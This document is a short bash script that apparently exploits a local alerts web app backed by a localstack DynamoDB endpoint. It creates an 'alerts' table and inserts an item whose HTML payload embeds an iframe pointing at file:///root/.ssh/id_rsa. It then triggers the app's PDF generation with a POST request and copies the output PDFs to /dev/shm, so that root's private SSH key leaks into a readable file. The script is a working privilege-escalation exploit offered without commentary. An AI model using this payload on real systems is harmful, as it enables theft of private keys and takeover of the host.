#!/bin/bash

aws --endpoint-url http://localhost:4566 dynamodb create-table --table-name alerts --attribute-definitions 'AttributeName=title,AttributeType=S' 'AttributeName=data,AttributeType=S' --key-schema 'AttributeName=title,KeyType=HASH' 'AttributeName=data,KeyType=RANGE' --provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=5

sleep 1

aws --endpoint-url http://localhost:4566 dynamodb put-item --table-name alerts --item '{"title": {"S": "Ransomware"}, "data": {"S": "<html><head></head><body><iframe src=\"file:///root/.ssh/id_rsa\"/></body></html>"}}'

sleep 1

curl -d "action=get_alerts" -X POST http://localhost:8000/

cp /var/www/bucket-app/files/*.pdf /dev/shm/

